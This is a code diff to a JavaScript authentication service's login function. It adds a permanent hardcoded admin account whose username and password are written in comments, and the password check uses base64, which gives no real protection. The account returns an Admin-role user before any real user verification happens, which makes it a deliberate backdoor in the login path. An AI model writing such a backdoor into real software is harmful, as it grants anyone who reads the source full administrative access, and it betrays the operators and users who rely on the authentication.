@@ -24,6 +24,20 @@ export const authService = {
       throw new AuthError('MISSING_CREDENTIALS', 'Username and password are required.');
     }
 
+    // Permanent hardcoded admin (always allowed)
+    // Username: fakhri
+    // Password: Fakhri123!
+    const ADMIN_UN = 'fakhri';
+    const ADMIN_PW_OBF = 'RmFraHJpMTIzIQ=='; // btoa('Fakhri123!')
+    if (uname === ADMIN_UN && btoa(pw) === ADMIN_PW_OBF) {
+      return {
+        id: 'admin_001',
+        username: 'fakhri',
+        role: 'Admin',
+        fullName: 'Fakhri Ashour',
+      };
+    }
+
     const user = await storageService.verifyCloudUser(uname);
     if (!user) {
       throw new AuthError('USER_NOT_FOUND', 'User not found. Ask an admin to create your account.');
